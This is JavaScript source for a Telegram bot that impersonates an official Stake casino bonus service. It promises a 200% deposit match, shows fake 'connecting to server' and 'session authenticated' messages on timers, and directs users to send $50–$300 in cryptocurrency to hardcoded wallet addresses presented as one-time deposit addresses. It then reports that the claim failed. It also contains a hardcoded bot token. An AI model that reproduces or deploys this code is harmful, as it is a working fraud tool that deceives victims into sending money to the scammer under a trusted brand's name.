const TelegramBot = require('node-telegram-bot-api');

// Replace with your bot's token from BotFather
const token = '7842631073:AAGjn_lIiX47MIhTebDkD6g43Kjnhb4ilDI';
const bot = new TelegramBot(token, { polling: true });

const userSessions = {}; // Store user progress


bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    // Send a picture first
    bot.sendPhoto(chatId, "public/pic.jpg", {
    }).then(() => {
        // Send message with inline buttons
        bot.sendMessage(chatId, "Welcome to the Official Stake bonus bot where you can get special Stake bonuses available to every Stake user!\n\n🚀 200% DEPOSIT MATCH BONUS\n\n🚨 Wager requirements: NONE\n\n🏧 EARLY ACCESS TO BONUSES", {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "💰 Claim Deposit Bonus 💰", callback_data: "deposit_bonus" }],
                    [{ text: "🎟️ Claim Bonus Code 🎟️", callback_data: "bonus_code" }],
                    [{ text: "💰 Claim via Fiat Currencies 💰", callback_data: "fiat_bonus" }]
                ]
            }
        });
    });
});

// Handle button clicks
bot.on("callback_query", (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data === "deposit_bonus" || data === "fiat_bonus") {
        bot.sendMessage(chatId, "What is your Stake.com username?\n\n🔽🔽🔽🔽🔽🔽🔽🔽🔽🔽\n\n*(Please type your username correctly or you might accidentally give someone else the bonus.)*", {
            parse_mode: "Markdown"
        });
        userSessions[chatId] = { step: "waiting_for_username" }; // Set step to wait for username
    } else if (data === "bonus_code") {
        bot.sendMessage(chatId, "You selected *Claim Bonus Code* ✅", { parse_mode: "Markdown" });
    } else if (data === "next_step") {
        if (userSessions[chatId] && userSessions[chatId].username) {
            let username = userSessions[chatId].username;
            
            // Simulate real-time process with delays
            setTimeout(() => bot.sendMessage(chatId, " Connecting to the first available Stake.com server..."), 1000);
            setTimeout(() => bot.sendMessage(chatId, ` Requesting account information for, *${username}* .`, { parse_mode: "Markdown" }), 2000);
            setTimeout(() => bot.sendMessage(chatId, " Connected to Server....."), 4000);
            setTimeout(() => bot.sendMessage(chatId, " Downloading User Account data...."), 5000);
            setTimeout(() => {
                bot.sendMessage(chatId, `Session Authenticated.\n\n✅ Successfully connected to the Stake account, *${username}* .`, {
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "CONTINUE TO DEPOSIT BONUS", callback_data: "proceed" }]
                        ]
                    }
                });
            }, 6000);
        }
    } else if (data === "proceed") {
        if (userSessions[chatId] && userSessions[chatId].username) {
            let username = userSessions[chatId].username;
            
            // Ask for deposit amount
            bot.sendMessage(chatId, `${username}, How much (in USD) would you like to deposit to your Stake account?\n\n(Type your answer below)`);
            setTimeout(() => bot.sendMessage(chatId, "Please respond with numbers only, no symbols please.\nFor example: 100"), 1000);
            setTimeout(() => bot.sendMessage(chatId, "Type the amount between 50 - 300"), 2000);
            setTimeout(() => bot.sendMessage(chatId, "⬇️⁣"), 3000);


            userSessions[chatId].step = "waiting_for_amount";
        }
    }

    bot.answerCallbackQuery(query.id);
});

// Handle user messages (username input and deposit amount)
bot.on("message", (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (userSessions[chatId] && userSessions[chatId].step === "waiting_for_username") {
        userSessions[chatId].username = text; // Store username
        userSessions[chatId].step = "username_entered"; // Move to next step

        bot.sendMessage(chatId, `Hello, *${text}* ✋\n\nClick the *NEXT* button to start the deposit bonus match process.\n\n(The entire process only takes *1 - 2 minutes*.)`, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Next", callback_data: "next_step" }]
                ]
            }
        });
    } else if (userSessions[chatId] && userSessions[chatId].step === "waiting_for_amount") {
        let amount = parseInt(text);
        
        if (!isNaN(amount) && amount >= 50 && amount <= 300) {
            userSessions[chatId].amount = amount; // Store valid amount
            userSessions[chatId].step = "amount_entered"; // Move to next step

            let username = userSessions[chatId].username;

            // Simulate reconnection process with delays
            setTimeout(() => bot.sendMessage(chatId, " Connection Interrupted. Reconnecting.."), 1000);
            setTimeout(() => bot.sendMessage(chatId, " Handshaking..."), 2000);
            setTimeout(() => bot.sendMessage(chatId, " Connected!"), 3000);
            setTimeout(() => {
                bot.sendMessage(chatId, `✅  Bot has successfully connected to *${username}* and is now matching this Stake account to the deposit bonus.\n\n*${username}*, Select the cryptocurrency you want for the deposit bonus.`, {
                    parse_mode: "Markdown",
                    reply_markup: {
                       inline_keyboard: [
                            [{ text: "BTC", callback_data: "crypto_btc" }],
                            [{ text: "ETH", callback_data: "crypto_eth" }],
                            [{ text: "SOLANA", callback_data: "crypto_solana" }],
                            [{ text: "USDT_BEP20", callback_data: "crypto_usdt_bep20" }],
                            [{ text: "USDT_ERC20", callback_data: "crypto_usdt_erc20" }],
                            [{ text: "USDT_TRC20", callback_data: "crypto_usdt_trc20" }],
                            [{ text: "DOGE", callback_data: "crypto_doge" }],
                            [{ text: "TRX", callback_data: "crypto_trx" }],
                            [{ text: "LTC", callback_data: "crypto_ltc" }],
                            [{ text: "BNB", callback_data: "crypto_bnb" }],
                            [{ text: "SHIB", callback_data: "crypto_shib" }],                                                                            
                            [{ text: "POL", callback_data: "crypto_pol" }],

                        ]
                    }
                });
            }, 4000);
        } else {
            bot.sendMessage(chatId, "❌ Invalid amount. Please enter a number between 50 and 300.");
        }
    }
});


bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data.startsWith("crypto_")) {
        let username = userSessions[chatId]?.username || "User";
        let selectedCrypto = data.replace("crypto_", "").toUpperCase();

        // Set crypto address based on selection
        const cryptoData = {
            BTC: {
                address: "bc1q2m0mx29exh420l8qmcf9ezycuc05hl2r9ypvfn",
                image: "public/btc.jpg" 
            },
            SOLANA: {
                address: "7BLD6pLtRZboGXYPrK1c2khTjuDWCwd8C8NEdcTVVDcu",
                image: "public/SOL.jpg" 
            },
            ETH: {
                address: "0x4940a9d87c560E83A94Fd6C826509f7403395114",
                image: "public/eth.jpg" 
            },
            USDT_BEP20: {
                address: "0x4940a9d87c560E83A94Fd6C826509f7403395114",
                image: "public/usdt-bep20.jpg" 
            },
            LTC: {
                address: "ltc1q0trr3l6nl7nmrq9gu3nk59fsqlx94720yz2m8r",
                image: "public/Litecoin.jpg" 
            },
            USDT_TRC20: {
                address: "TNLz9LpzVi2Jg631v6RWAkAmHMMxxfgUxr",
                image: "public/usdt-trc20.jpg" 
            },
            USDT_ERC20: {
                address: "0x4940a9d87c560E83A94Fd6C826509f7403395114",
                image: "public/usdt-trc20.jpg" 
            },
            DOGE: {
                address: "DT7fzhjzauCEd5ZNCMvCHzgXH17cxvT1y1",
                image: "public/doge.jpg" 
            },
            TRX: {
                address: "DT7fzhjzauCEd5ZNCMvCHzgXH17cxvT1y1",
                image: "public/trx.jpg" 
            },
            BNB: {
                address: "0x4940a9d87c560E83A94Fd6C826509f7403395114",
                image: "public/bnb.jpg" 
            },
            SHIB: {
                address: "0x4940a9d87c560E83A94Fd6C826509f7403395114",
                image: "public/shib.jpg" 
            },
            POL: {
                address: "0x4940a9d87c560E83A94Fd6C826509f7403395114",
                image: "public/pol.jpg" 
            },









        };

        let cryptoInfo = cryptoData[selectedCrypto] || { address: "Unavailable", image: "" };

        // Send crypto image first
       

        await bot.sendMessage(chatId, 
            `I will now retrieve a single-use address associated with the Stake account *${username}* you provided earlier to facilitate our deposit match bonus with no wager requirement.`, 
            { parse_mode: "Markdown" }
        );

        await bot.sendMessage(chatId, 
            "🚼 Your deposit will appear in your Transactions page after 1 confirmation is reached."
        );

        await bot.sendMessage(chatId, 
            `✅ Your one-time use *${selectedCrypto}* address has been generated successfully!\n\n------------------------------------\n${cryptoInfo.address}\n------------------------------------`, 
            { parse_mode: "Markdown" }
        );
        if (cryptoInfo.image) {
            await bot.sendPhoto(chatId, cryptoInfo.image);
        }
        await bot.sendMessage(chatId, 
            "🟨 After you have sent your deposit, Please click the *CONTINUE* button.", 
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "CONTINUE", callback_data: "continue_after_deposit" }]
                    ]
                }
            }
        );
    }
});



bot.on("callback_query", (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data === "continue_after_deposit") {
        let username = userSessions[chatId]?.username || "User";

        bot.sendMessage(chatId, `${username}, After you click the submit button, your 200% deposit match bonus claim will be completed and your Stake account will be credited after (1) confirmation is reached.`, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "SUBMIT", callback_data: "submit_deposit" }]
                ]
            }
        });
    } else if (data === "submit_deposit") {
        bot.sendMessage(chatId, "❌ You have failed to complete the deposit match bonus.");
    }
});


console.log("Bot is running...");